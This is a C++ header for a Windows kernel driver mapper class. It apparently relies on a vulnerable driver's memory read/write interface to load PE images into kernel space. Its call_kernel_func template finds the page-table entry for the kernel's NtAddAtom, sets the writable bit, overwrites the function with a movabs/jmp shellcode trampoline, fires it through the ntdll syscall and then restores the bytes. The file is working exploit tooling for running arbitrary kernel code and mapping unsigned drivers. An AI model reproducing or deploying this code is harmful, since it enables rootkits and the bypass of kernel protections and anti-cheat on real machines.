#pragma once

#include <cstdint>
#include <string>
#include <string_view>
#include <functional>

#include <core/context.h>
#include <core/utils.h>

#include <lsapi.h>

class c_mapper {
public:
    c_mapper() {}

    [[nodiscard]] static auto get_inst() -> c_mapper* { 
        static c_mapper instance;
        return &instance;
    }

    [[nodiscard]] auto init() -> bool;
    [[nodiscard]] auto uninit() -> bool;

    [[nodiscard]] auto load(uint8_t* data_buffer, uint32_t data_size, uint8_t pe_flags = 0) -> bool;
    [[nodiscard]] auto load(std::string_view image_path, uint8_t pe_flags = 0) -> bool;

    auto find_pt_for_va(uint64_t virtual_address) -> uint64_t;

    template <typename T = uint64_t, typename... Args>
    inline auto call_kernel_func(uint64_t func_addr, Args... arguments) -> T {
        
        using nt_add_atom_t = T(*)(std::remove_cvref_t<Args>...);
        auto nt_add_atom_fn = reinterpret_cast<nt_add_atom_t>(core::context::ntdll::nt_add_atom);
        if (!nt_add_atom_fn) return T{};

        // @note: 64-bit shellcode bytes
        uint8_t shellcode[] = {
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // movabs rax, func_addr
            0xFF, 0xE0                                                  // jmp rax
        };
        *reinterpret_cast<uint64_t*>(&shellcode[2]) = func_addr;

        uint64_t target_va = core::context::ntos::nt_add_atom;
        auto kernel_pt_base = c_mapper::find_pt_for_va(target_va);
        if (!kernel_pt_base) return T{};

        // @note: read original pte and backup original target bytes
        WINNOTIFY_READ_VIRTUAL_MEMORY pte_req{};
        if (!LsReadVirtualMemory(kernel_pt_base, &pte_req)) return T{};
        uint64_t original_pte = *reinterpret_cast<uint64_t*>(&pte_req.Data[0]);
        uint64_t writable_pte = original_pte | (1ULL << 1); // set writable bit

        WINNOTIFY_READ_VIRTUAL_MEMORY code_req{};
        if (!LsReadVirtualMemory(target_va, &code_req)) return T{};

        uint8_t original_bytes[sizeof(shellcode)];
        std::memcpy(original_bytes, &code_req.Data[0], sizeof(shellcode));

        // @note: temporarily patch pte to writable
        LsWriteVirtualMemory(kernel_pt_base, reinterpret_cast<ULONG64>(&writable_pte), sizeof(writable_pte));

        // @note: copy the shellcode
        LsWriteVirtualMemory(target_va, reinterpret_cast<ULONG64>(&shellcode), sizeof(shellcode));

        // @note: execute syscall
        T result = nt_add_atom_fn(arguments...);

        // @note: restore the bytes
        LsWriteVirtualMemory(target_va, reinterpret_cast<ULONG64>(&original_bytes), sizeof(shellcode));

        // @note: restore pte protection
        LsWriteVirtualMemory(kernel_pt_base, reinterpret_cast<ULONG64>(&original_pte), sizeof(original_pte));

        return result;
    }
};